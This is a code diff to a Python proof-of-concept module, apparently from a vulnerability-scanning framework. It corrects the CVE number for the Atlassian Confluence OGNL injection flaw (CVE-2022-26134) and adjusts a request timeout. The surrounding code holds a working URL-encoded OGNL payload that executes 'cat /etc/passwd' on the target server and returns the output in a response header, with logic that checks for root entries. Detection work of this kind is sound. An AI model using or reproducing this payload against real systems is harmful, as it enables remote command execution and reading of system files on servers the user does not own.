@@ -17,8 +17,8 @@ class POC(POCBase):
             略  
         """,                                # POC描述，写更新描述，没有就不写
 
-        "name" : "Atlassian Confluence OGNL表达式注入漏洞（CVE-2022-26143）",                        # 漏洞名称
-        "VulnID" : "CVE-2022-26143",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
+        "name" : "Atlassian Confluence OGNL表达式注入漏洞（CVE-2022-26134）",                        # 漏洞名称
+        "VulnID" : "CVE-2022-26134",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
         "AppName" : "Atlassian Confluence",                     # 漏洞应用名称
         "AppVersion" : """
             ConfluenceServerandDataCenter>=1.3.0
@@ -55,8 +55,8 @@ class POC(POCBase):
         不存在漏洞：vuln = [False,""]
         """
         vuln = [False,""]
+        # verify payload
         url = self.target + "/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22cat%20/etc/passwd%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/" # url自己按需调整
-        
 
         headers = {"User-Agent":get_random_ua(),
                     "Connection":"close",
@@ -67,7 +67,7 @@ class POC(POCBase):
             """
             检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
             """
-            req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False,allow_redirects=False)
+            req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = 20,verify = False,allow_redirects=False)
 
             if req.status_code == 302 and "root:/root" in req.headers["X-Cmd-Response"]:
                 vuln = [True,req.headers["X-Cmd-Response"]]
